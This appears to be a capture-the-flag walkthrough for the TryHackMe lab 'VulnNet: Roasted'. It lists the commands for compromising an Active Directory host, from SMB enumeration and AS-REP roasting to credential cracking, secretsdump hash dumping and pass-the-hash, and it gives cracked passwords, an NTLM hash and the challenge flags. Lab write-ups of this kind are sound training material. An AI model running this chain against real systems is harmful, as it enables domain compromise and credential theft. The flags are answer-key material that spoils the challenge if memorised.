# VulnNet: Roasted - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.205.111

#confirm host and domain details
crackmapexec smb 10.10.205.111

dig axfr @10.10.205.111 vulnnet-rst.local
#no output

smbmap -H 10.10.205.111
#no shares listed

smbmap -u anonymous -H 10.10.205.111
#this works, shows IPC share as readable

smbclient -L \\\\10.10.205.111
#this methods lists some shares

#we are able to access two shares
smbclient \\\\10.10.205.111\\VulnNet-Business-Anonymous
#use mget to get all files

smbclient \\\\10.10.205.111\\VulnNet-Enterprise-Anonymous
#use mget again

ls -la
#go through the files

vim names.txt
#add enumerated names

rpcclient 10.10.205.111
#error

rpcclient -U "" -N 10.10.205.111
#error

#sid user enum
lookupsid.py anonymous@10.10.205.111
#this outputs usernames

vim usernames.txt
#clean up list and write valid usernames

GetNPUsers.py -dc-ip 10.10.205.111 vulnnet-rst.local/ -usersfile usernames.txt -request
#AS-REP roasting attack
#gives hash for t-skid user

hashcat -a 0 -m 18200 krbhash.txt /usr/share/wordlists/rockyou.txt
#crack the hash

vim pass.txt
#store the password

crackmapexec smb -u usernames.txt -p pass.txt --shares 10.10.205.111 --continue-on-success
#this shows valid creds for 't-skid'

#evil-winrm and psexec.py do not give shell
#we can try enumerating smb shares as t-skid

smbmap -u t-skid -p tj072889* -H 10.10.205.111
#this shows some shares as readable

smbclient \\\\10.10.205.111\\IPC$ -U t-skid

smbclient \\\\10.10.205.111\\NETLOGON -U t-skid
#use get to download file

cat ResetPassword.vbs
#contains creds

evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i 10.10.205.111
#we get shell

cd C:\Users

gci -recurse . | select fullname
#prints directory contents recursively

type C:\Users\enterprise-core-vn\Desktop\user.txt
#user flag

cd a-whitehat
#we can upload winpeas and SharpHound here

upload /home/sv/Tools/winPEASx64.exe

upload /home/sv/Tools/SharpHound.exe

.\winPEASx64.exe
#we cannot run it

.\SharpHound.exe
#we are able to run this
#generates a .zip file

download C:\Users\a-whitehat\20221226215103_BloodHound.zip /home/sv/roasted.zip
#download zip file to attacker
#download fails

#we can use manual enumeration

whoami /groups
#'a-whitehat' is a part of Domain Admins group
#we can try dumping hashes

secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.205.111
#this dumps hashes
#use Administrator hash with evil-winrm

evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.10.205.111
#we get shell
#read system flag
```

* Open ports & services:

  * 53 - domain - Simple DNS Plus
  * 88 - kerberos-sec - Kerberos
  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 389 - ldap - AD LDAP
  * 445 - microsoft-ds
  * 464 - kpasswd5
  * 3268 - ldap - AD LDAP
  * 5985 - http - HTTPAPI httpd 2.0
  * 9389 - mc-nmf - .NET Message Framing
  * 49665,49667,49669,49673,49690,49709 - msrpc - RPC
  * 49670 - ncacn_http - RPC over HTTP 1.0

* ```nmap``` shows that domain name as 'vulnnet-rst.local'; we can confirm the host and domain details using ```crackmapexec``` as well.

* We can attempt DNS enumeration using ```dig``` but it does not work.

* Now, for enumerating SMB shares such as ```smbmap``` and ```smbclient``` - we are able to list some shares using ```smbclient```.

* ```smbmap``` works only if we mention user as 'anonymous'.

* Out of the listed shares, we are able to access two shares - 'VulnNet-Business-Anonymous' and 'VulnNet-Enterprise-Anonymous'.

* Both of these shares contain a few .txt files - we can go through them and check for clues.

* From all the .txt files, we are able to enumerate a few names; we can add this to a file:

  * Alexa Whitehat
  * Jack Goldenhand
  * Tony Skid
  * Johnny Leet

* We can attempt enumeration using ```rpcclient``` but this fails to give us anything.

* Also, the output from ```smbmap``` denoted that the 'IPC$' share is 'read-only' - this means we can use a tool like ```lookupsid.py``` for SID user enumeration.

* Using the username 'anonymous', ```lookupsid.py``` gives us a list of valid usernames - we can clean up the output and write these usernames to a file.

* As we have a list of valid usernames, we can try using 'AS-REP Roasting' attack using ```GetNPUsers.py```.

* This gets us the hash for 't-skid' user; we can crack the hash using ```hashcat```.

* We are able to crack the hash; we can now check for shell using ```crackmapexec```.

* This shows that we can use this password for 't-skid'; we can attempt logging in using ```evil-winrm``` or ```psexec.py```, but it does not work.

* We can try enumerating the shares as user 't-skid' to find other info; ```smbmap``` shows that we can read IPC$, NETLOGON and SYSVOL shares now.

* The NETLOGON share contains a .vbs file; going through this, we can find the password for 'a-whitehat' user.

* Using ```evil-winrm```, we get a shell as 'a-whitehat'; user flag can be found by printing directory contents recursively.

* Now, as it is given in the challenge that this is a network of machines, we can use both ```winpeas``` and ```bloodhound``` for enumeration of local machine and AD environment, respectively.

* We can use ```evil-winrm```'s upload and download feature to transfer files.

* Now, we get a virus alert while running ```winpeas``` so we can try running ```SharpHound```.

* This works and we get a .zip file as a result - we can try downloading this in attacker machine but it does not work.

* As both methods of automated enumeration have failed, we can try manual enumeration.

* ```whoami /groups``` shows that our user is a part of the "Domain Admins" group.

* So, we can try using a tool like ```secretsdump.py``` and attempt to dump hashes.

* This dumps NTLM hashes; we can use the Administrator hash with ```evil-winrm``` to get shell and read system flag.

```markdown
1. What is the user flag? - THM{726b7c0baaac1455d05c827b5561f4ed}

2. What is the system flag? - THM{16f45e3934293a57645f8d7bf71d8d4c}
```
